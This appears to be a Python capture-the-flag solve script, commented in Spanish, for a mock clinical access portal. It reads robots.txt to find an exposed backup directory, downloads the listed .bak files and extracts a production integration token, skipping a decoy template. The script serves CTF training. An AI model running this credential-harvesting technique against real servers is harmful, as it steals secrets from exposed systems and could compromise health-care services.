#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Portal de acceso clinico (203.0.113.10:8001)

Vulnerabilidad: el administrador dejo un directorio de respaldos accesible y
listado, y lo declaro en /robots.txt. Dentro hay una copia de la configuracion
de produccion (`sich.conf.bak`) con el token de integracion (la flag), junto a
una plantilla de ejemplo (`config.sample.bak`) que es el senuelo.

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import re
import sys
from urllib.parse import urljoin

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8001")
TOKEN_RE = re.compile(r"^token_integracion=\s*(\S+)\s*$", re.MULTILINE)
LINK_RE = re.compile(r'href="([^"]+\.(?:bak|old|zip|tar|gz|sql|txt))"', re.IGNORECASE)


def main() -> int:
    s = requests.Session()

    # 1) robots.txt revela los directorios "ocultos"
    robots = s.get(f"{BASE}/robots.txt", timeout=15).text
    print("[*] robots.txt:")
    for linea in robots.splitlines():
        if linea.lower().startswith("disallow"):
            print(f"    {linea}")

    # 2) Listado del directorio de respaldos
    listado = s.get(f"{BASE}/respaldo-sich/", timeout=15)
    archivos = sorted(set(LINK_RE.findall(listado.text)))
    print(f"[*] respaldos encontrados: {archivos}")

    # 3) Descargar cada respaldo y quedarse con el de produccion
    for nombre in archivos:
        contenido = s.get(urljoin(listado.url, nombre), timeout=15).text
        es_ejemplo = re.search(r"EJEMPLO|NO usar en produccion|plantilla", contenido, re.I)
        m = TOKEN_RE.search(contenido)
        if not m:
            continue
        token = m.group(1)
        etiqueta = "senuelo" if es_ejemplo else "produccion"
        print(f"[*] {nombre} ({etiqueta}): {token}")
        if es_ejemplo or "ejemplo" in token:
            continue
        print(f"[+] FLAG: {token}")
        with open("flag.txt", "w", encoding="utf-8") as fh:
            fh.write(token + "\n")
        return 0

    print("[-] no se encontro un token de produccion")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
